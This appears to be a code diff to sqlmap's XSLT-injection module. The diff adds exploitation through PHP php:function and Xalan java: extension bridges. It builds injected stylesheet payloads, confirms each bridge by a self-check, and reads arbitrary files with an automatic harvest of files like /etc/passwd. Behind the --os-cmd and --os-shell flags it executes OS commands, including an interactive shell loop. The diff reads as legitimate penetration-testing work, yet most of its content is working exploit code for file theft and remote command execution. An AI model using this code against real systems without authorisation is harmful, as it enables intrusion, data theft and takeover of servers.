@@ -26,8 +26,13 @@ between elements can introduce whole XSLT instructions, while input landing insi
 carry an XPath expression. Nothing is inferred from a payload merely "looking like" it worked - every
 tier is confirmed by a per-run random sentinel or by a value the application cannot produce by itself.
 
-Deliberately reported but NOT exploited: PHP registerPHPFunctions(), EXSLT exsl:document (file WRITE) and
-saxon:eval. Those are RCE / write primitives and sit outside what this switch is for.
+Once an injection is confirmed in the ELEMENT slot, sqlmap also probes the processor's extension bridges
+(PHP php:function, Xalan java:) - each confirmed by a deterministic self-check, never by the unreliable
+function-available(). A confirmed read bridge gives arbitrary file read even on an XSLT 1.0 engine, where
+document() only loads XML and unparsed-text() is unavailable, so it is used for the automatic harvest and
+for '--file-read'. Command execution through a bridge runs only under '--os-cmd' / '--os-shell', exactly
+like the SQL and SSTI takeover. File WRITE (EXSLT exsl:document) and saxon:eval are reported but never
+driven - a write is destructive and belongs to '--file-write'.
 """
 
 import re
@@ -37,6 +42,7 @@ from collections import namedtuple
 from lib.core.common import beep
 from lib.core.common import dataToOutFile
 from lib.core.common import randomStr
+from lib.core.common import urldecode
 from lib.core.convert import getBytes
 from lib.core.convert import getText
 from lib.core.convert import getUnicode
@@ -50,9 +56,15 @@ from lib.core.settings import XSLT_MAX_FILE_LENGTH
 from lib.core.settings import XSLT_MAX_HARVEST
 from lib.core.settings import XSLT_XML_HARVEST
 from lib.core.settings import XXE_FILE_HARVEST
-from lib.core.settings import XSLT_RCE_PROBES
+from lib.core.settings import XSLT_BRIDGES
+from lib.core.settings import XSLT_BRIDGE_PHP
+from lib.core.settings import XSLT_BRIDGE_JAVA
+from lib.core.settings import XSLT_ADVISORY_PROBES
 from lib.core.settings import XSLT_VENDOR_PROPERTIES
 from lib.request.connect import Connect as Request
+# NOT lib.core.common.urlencode: that one keeps '&', '=' and '%' safe by design, which is exactly what
+# has to be escaped here. Imported under a distinct name because _quote() below is the XPath literal.
+from thirdparty.six.moves.urllib.parse import quote as _urlquote
 
 SENTINEL = randomStr(length=10, lowercase=True)
 
@@ -80,11 +92,13 @@ def _delim(place):
 
 
 def _originalValue(place, parameter):
+    # decoded on the way in, re-encoded by _send() on the way out, so the module works in plain text
+    # and the untouched baseline probe reproduces exactly what the application originally received
     for pair in (conf.parameters.get(place) or "").split(_delim(place)):
         if '=' in pair:
             name, _, value = pair.partition('=')
             if name.strip() == parameter:
-                return value
+                return urldecode(value, convall=True)
     return None
 
 
@@ -101,13 +115,18 @@ def _replaceSegment(place, parameter, value):
 
 def _send(place, parameter, value):
     """One request with the target parameter set to `value`, reusing sqlmap's request machinery so the
-    URL, cookies, headers, proxy and delay all behave exactly as in a normal run."""
+    URL, cookies, headers, proxy and delay all behave exactly as in a normal run.
+
+    The value is URL-encoded (as '--ssti' already does). A stylesheet payload is XML, so it legitimately
+    carries '&' - both as an XML entity (&amp;/&quot;, see _attr) and inside a command or path - and a
+    raw '&' in a GET value is the parameter delimiter, which would split the request and deliver a
+    truncated stylesheet."""
 
     if conf.delay:
         time.sleep(conf.delay)
 
     saved = conf.parameters.get(place, "")
-    conf.parameters[place] = _replaceSegment(place, parameter, value)
+    conf.parameters[place] = _replaceSegment(place, parameter, _urlquote(value, safe=""))
     try:
         if conf.verbose >= 3:
             logger.log(CUSTOM_LOGGING.PAYLOAD, "%s=%s" % (parameter, value))
@@ -135,10 +154,26 @@ def _echoed(page, needle):
     return bool(page) and needle in getUnicode(page)
 
 
+def _attr(expression):
+    """Escape an XPath expression for the XML ATTRIBUTE it is about to land in.
+
+    Every slot ends up inside select="...", and XPath 1.0 has no escape character - so _quote() has to
+    fall back to double quotes for a value containing an apostrophe, and those quotes TERMINATE the
+    attribute. The stylesheet then fails to compile and the whole probe silently returns nothing:
+    '--os-cmd="echo \'hi\'"' reported "no output captured", and '--file-read' of a path holding an
+    apostrophe or an '&' failed against real libxslt while the same file at a plain path read fine.
+
+    '>' is legal inside an attribute value and is left alone, so a shell redirect stays readable."""
+
+    return (getUnicode(expression).replace("&", "&amp;")
+                                  .replace("<", "&lt;")
+                                  .replace('"', "&quot;"))
+
+
 def _valuePayload(expression):
     """An XPath expression for the VALUE slot: the input already sits inside select="...", so only the
     expression itself is injected."""
-    return expression
+    return _attr(expression)
 
 
 # Conventional prefix for the XSLT namespace. A stylesheet must bind it to be a stylesheet at all; a
@@ -149,7 +184,7 @@ _XSL_PREFIX = "xsl"
 def _elementPayload(expression):
     """A whole <xsl:value-of> instruction for the ELEMENT slot. The stylesheet already binds the 'xsl'
     prefix (it could not be a stylesheet otherwise), so the instruction compiles in place."""
-    return '<%s:value-of select="%s"/>' % (_XSL_PREFIX, expression)
+    return '<%s:value-of select="%s"/>' % (_XSL_PREFIX, _attr(expression))
 
 
 _BUILDERS = ((CONTEXT_ELEMENT, _elementPayload), (CONTEXT_VALUE, _valuePayload))
@@ -311,9 +346,15 @@ def _probeCompile(place, parameter, baseline):
     return None, None, None
 
 
-def _readFile(place, parameter, context, path, readers=("unparsed-text", "document")):
-    """T4: read a text file. document() parses its target as XML, so a non-XML file only surfaces through
-    unparsed-text() (XSLT 2.0+). Both are tried by default and whichever returns content wins."""
+def _readFile(place, parameter, context, path, readers=("unparsed-text", "document"), bridges=()):
+    """T4: read a file. A confirmed extension bridge (php:function / java:) is tried first because it
+    reaches ANY file on a 1.0 engine. Otherwise document() parses its target as XML, so a non-XML file
+    only surfaces through unparsed-text() (XSLT 2.0+). Whichever returns content wins."""
+
+    for bridge in bridges:
+        content = _bridgeRead(place, parameter, bridge, path)
+        if content and content.strip():
+            return content, "%s bridge" % bridge[0].split(" ")[0].lower()
 
     build = dict(_BUILDERS)[context]
     uri = path if "://" in path else "file:///%s" % getText(path).replace("\\", "/").lstrip("/")
@@ -347,25 +388,42 @@ def _dumpSourceDocument(place, parameter, context):
     return None
 
 
-def _harvestFiles(place, parameter, context):
+def _harvestFiles(place, parameter, context, bridges=()):
     """Proactive, best-effort file harvest once the injection is CONFIRMED, the way the other non-SQL
     engines auto-dump what they can reach: a user who reaches for '--xslt' should not have to know that
     '--file-read' exists to see impact.
 
-    Two reader primitives, because they cover different engines: unparsed-text() takes any text file but
-    needs XSLT 2.0+, while document() works on 1.0 (most of the installed base) yet only loads well-formed
-    XML. Content is de-duplicated so an engine that resolves every missing path to the same stub cannot
-    masquerade as many distinct reads. Bounded by XSLT_MAX_HARVEST."""
+    A confirmed bridge reads arbitrary text on any engine, so the plain-text targets (/etc/passwd etc.)
+    are harvested through it. Without one, the two portable readers cover different engines: unparsed-text()
+    takes any text file but needs XSLT 2.0+, while document() works on 1.0 (most of the installed base)
+    yet only loads well-formed XML. Content is de-duplicated so an engine that resolves every missing path
+    to the same stub cannot masquerade as many distinct reads. Bounded by XSLT_MAX_HARVEST."""
 
     harvested = []
     seen = set()
-    for reader, paths in (("unparsed-text", XXE_FILE_HARVEST), ("document", XSLT_XML_HARVEST)):
+    read = set()
+
+    # every confirmed bridge, not just the first: _readFile() already falls through all of them, and a
+    # bridge that fails on one path (permissions, a binary file) must not strand the rest of the harvest
+    plans = [(_, XXE_FILE_HARVEST) for _ in bridges]        # arbitrary-text read on any engine
+    plans.append((None, XXE_FILE_HARVEST))                  # unparsed-text() (XSLT 2.0+)
+    plans.append((None, XSLT_XML_HARVEST))                  # document() (XSLT 1.0, XML only)
+
+    for bridge, paths in plans:
         for path in paths:
             if len(harvested) >= XSLT_MAX_HARVEST:
                 return harvested
-            content, how = _readFile(place, parameter, context, path, readers=(reader,))
+            if path in read:
+                continue        # a later plan must not re-probe what an earlier one already returned
+            if bridge is not None:
+                content = _bridgeRead(place, parameter, bridge, path)
+                how = "%s bridge" % bridge[0].split(" ")[0].lower()
+            else:
+                reader = "unparsed-text" if paths is XXE_FILE_HARVEST else "document"
+                content, how = _readFile(place, parameter, context, path, readers=(reader,))
             if not (content and content.strip()):
                 continue
+            read.add(path)
             key = content.strip()
             if key in seen:
                 continue
@@ -374,20 +432,93 @@ def _harvestFiles(place, parameter, context):
     return harvested
 
 
-def _probeRce(place, parameter, context):
-    """Report - never invoke - the extension primitives that would turn this into code execution. Their
-    mere availability is the finding; exercising them is out of scope for this switch."""
+def _bridgeElementPayload(prefix, uri, expression):
+    """An <xsl:value-of> that BINDS the extension namespace the bridge needs. Only the element slot can do
+    this - the value slot cannot introduce a namespace - so bridge exploitation is element-slot only. The
+    expression is sentinel-wrapped like every other probe, so an echo endpoint cannot forge the result."""
+    return '<%s:value-of xmlns:%s="%s" select="%s"/>' % (_XSL_PREFIX, prefix, uri, _attr(_wrap(expression)))
+
+
+def _confirmBridge(place, parameter, bridge):
+    """Confirm a bridge by EVALUATION, not by function-available() (which Xalan answers 'false' to while
+    the bridge works). The self-check transforms a per-run random input in a way the application cannot:
+    PHP reverses a marker, Xalan hex-encodes a random integer. The sentinel-split wrap defeats reflection,
+    and the transformed value defeats a lucky echo of the operand."""
+
+    _label, kind, prefix, uri, _readT, _execT = bridge
+    if kind == XSLT_BRIDGE_PHP:
+        marker = randomStr(length=8, lowercase=True)
+        expression = "php:function('strrev',%s)" % _quote(marker)
+        expected = marker[::-1]
+    elif kind == XSLT_BRIDGE_JAVA:
+        number = int(randomStr(length=6, alphabet="123456789"))
+        expression = "java:java.lang.Integer.toHexString(%d)" % number
+        expected = "%x" % number
+    else:
+        return False
+    payload = _bridgeElementPayload(prefix, uri, expression)
+    captured = _captured(page=_send(place, parameter, payload), payload=payload, span="0,64")
+    return captured is not None and captured.strip() == expected
+
+
+def _detectBridges(place, parameter, context):
+    """The extension bridges confirmed working on this injection. Element slot only (a bridge needs its
+    namespace bound), so the value slot returns nothing."""
+
+    if context != CONTEXT_ELEMENT:
+        return []
+    return [bridge for bridge in XSLT_BRIDGES if _confirmBridge(place, parameter, bridge)]
+
+
+def _bridgeRead(place, parameter, bridge, path):
+    """Arbitrary file read through a confirmed bridge - unlike document() (XML only) and unparsed-text()
+    (XSLT 2.0+), this reaches any file the process can open, on a 1.0 engine."""
+
+    _label, _kind, prefix, uri, readT, _execT = bridge
+    expression = readT % _quote(getText(path))
+    payload = _bridgeElementPayload(prefix, uri, expression)
+    captured = _captured(page=_send(place, parameter, payload), payload=payload, span="1,%d" % XSLT_MAX_FILE_LENGTH)
+    if captured and captured.strip():
+        return captured[:XSLT_MAX_FILE_LENGTH]
+    return None
+
+
+def _bridgeExec(place, parameter, bridge, command):
+    """Run one OS command through a confirmed exec bridge and return its captured stdout, or None. Only
+    reached under --os-cmd / --os-shell."""
+
+    _label, _kind, prefix, uri, _readT, execT = bridge
+    if not execT:
+        return None
+    payload = _bridgeElementPayload(prefix, uri, execT % _quote(getText(command)))
+    captured = _captured(page=_send(place, parameter, payload), payload=payload, span="0,%d" % XSLT_MAX_FILE_LENGTH)
+    return captured.rstrip("\n") if captured is not None else None
+
+
+def _advisories(place, parameter, context):
+    """Report - never drive - the file-write / eval surfaces. Their availability is the finding: a write
+    is destructive ('--file-write' territory) and saxon:eval needs Saxon-PE/EE."""
 
     build = dict(_BUILDERS)[context]
     retVal = []
-    for label, expression in XSLT_RCE_PROBES:
+    for label, expression in XSLT_ADVISORY_PROBES:
         payload = build(_wrap(expression))
         captured = _captured(page=_send(place, parameter, payload), payload=payload, span="0,40")
-        # function-available() answers the STRING 'true'/'false', so a non-empty capture is not a hit -
-        # only an explicit true is. Reporting on non-empty would flag every engine as exploitable.
+        # the probe answers the STRING 'true'/'false', so only an explicit 'true' counts
         if captured is not None and captured.strip().lower() == "true":
             retVal.append(label)
     return retVal
+
+
+def _osShell(execFn):
+    """Interactive OS-shell loop (runs under --batch like the SQL one). EOF / 'exit' / 'quit' leaves."""
+    from lib.core.common import readInput
+    logger.info("calling XSLT OS shell. Enter commands or 'exit'/'quit' to leave")
+    while True:
+        command = readInput("os-shell> ", checkBatch=False)
+        if not command or command.strip().lower() in ("exit", "quit"):
+            break
+        execFn(command.strip())
 
 
 def _dumpFileRead(remoteFile, content):
@@ -470,20 +601,51 @@ def xsltScan():
             if detail:
                 extra.append("Proof: the engine computed %s" % detail)
 
-            rce = _probeRce(place, parameter, context)
-            if rce:
-                extra.append("Extensions available (NOT exercised): %s" % ", ".join(rce))
-                logger.warning("the engine exposes %s - this injection can reach code execution; "
-                               "'--xslt' reports it but does not use it" % ", ".join(rce))
+            # Confirmed-by-evaluation extension bridges (php:function / java:). These are real read/exec
+            # primitives, not a function-available() guess, and reading a file through one is the same
+            # risk class as document() - which this engine already drives - so the read is automatic.
+            bridges = _detectBridges(place, parameter, context)
+            execBridge = next((_ for _ in bridges if _[5]), None)
+            if bridges:
+                extra.append("Extension bridges confirmed: %s" % ", ".join(_[0] for _ in bridges))
+
+            advisories = _advisories(place, parameter, context)
+            if advisories:
+                extra.append("Extensions available (NOT exercised): %s" % ", ".join(advisories))
 
             _report(slot, title, extra)
+
+            wantsExec = any(conf.get(_) for _ in ("osCmd", "osShell"))
+
+            # --os-cmd / --os-shell: command execution runs ONLY when explicitly asked, exactly like the
+            # SQL and SSTI takeover. Without an exec bridge sqlmap says so rather than pretending.
+            if wantsExec:
+                if execBridge is None:
+                    # naming java: here was misleading: it IS an exec-capable namespace in general, but
+                    # this engine drives it read-only on purpose (no stdout comes back), so a target
+                    # with ONLY the java bridge confirmed was told to look for something it already had
+                    readOnly = ", ".join(_[0] for _ in bridges if not _[5])
+                    errMsg = "OS command execution needs a confirmed exec bridge (php:function); "
+                    errMsg += ("the '%s' bridge is read-only here" % readOnly) if readOnly else "none is available on this target"
+                    logger.error(errMsg)
+                else:
+                    if conf.get("osCmd"):
+                        output = _bridgeExec(place, parameter, execBridge, conf.osCmd)
+                        conf.dumper.singleString("XSLT os-cmd ('%s') via %s:\n%s"
+                                                 % (conf.osCmd, execBridge[0], output if output is not None else "(no output captured)"))
+                    if conf.get("osShell"):
+                        _osShell(lambda command: conf.dumper.singleString(
+                            "%s\n%s" % (command, _bridgeExec(place, parameter, execBridge, command) or "(no output captured)")))
+            elif execBridge is not None:
+                logger.info("the '%s' bridge allows OS command execution; you are advised to try "
+                            "'--os-shell' (interactive) or '--os-cmd=<command>' (single command)" % execBridge[0])
 
             # A confirmed finding is exploited automatically, like every other non-SQL switch: whoever
             # reaches for '--xslt' should not need to know that '--file-read' exists to see impact. An
             # explicit '--file-read' overrides the harvest and is honoured verbatim instead.
             if conf.fileRead:
                 logger.info("reading file '%s' through the XSLT engine" % conf.fileRead)
-                content, how = _readFile(place, parameter, context, conf.fileRead)
+                content, how = _readFile(place, parameter, context, conf.fileRead, bridges=bridges)
                 if content:
                     logger.info("XSLT file read succeeded via %s (%d characters)" % (how, len(content)))
                     if how.startswith("string(document("):
@@ -491,9 +653,9 @@ def xsltScan():
                                        "CONTENT rather than its raw bytes")
                     _dumpFileRead(conf.fileRead, content)
                 else:
-                    logger.warning("XSLT file read of '%s' failed. document() only reads well-formed XML, "
-                                   "and unparsed-text() needs an XSLT 2.0+ engine (this one reports '%s')"
-                                   % (conf.fileRead, vendor))
+                    logger.warning("XSLT file read of '%s' failed. Without an extension bridge, document() "
+                                   "only reads well-formed XML and unparsed-text() needs an XSLT 2.0+ engine "
+                                   "(this one reports '%s')" % (conf.fileRead, vendor))
             else:
                 source = _dumpSourceDocument(place, parameter, context)
                 if source:
@@ -501,13 +663,13 @@ def xsltScan():
                     conf.dumper.singleString("XSLT: %s parameter '%s' source document\n%s" % (place, parameter, source))
 
                 logger.info("harvesting reachable files through the XSLT engine")
-                harvested = _harvestFiles(place, parameter, context)
+                harvested = _harvestFiles(place, parameter, context, bridges=bridges)
                 for path, content, how in harvested:
                     logger.info("read '%s' via %s (%d characters)" % (path, how, len(content)))
                     _dumpFileRead(path, content)
                 if not harvested:
-                    logger.info("no file could be read automatically (document() needs well-formed XML and "
-                                "unparsed-text() needs an XSLT 2.0+ engine)")
+                    logger.info("no file could be read automatically (a bridge reads any file, else "
+                                "document() needs well-formed XML and unparsed-text() needs XSLT 2.0+)")
                 if source or harvested:
                     logger.info("use '--file-read' to target one specific file instead of this harvest")
 
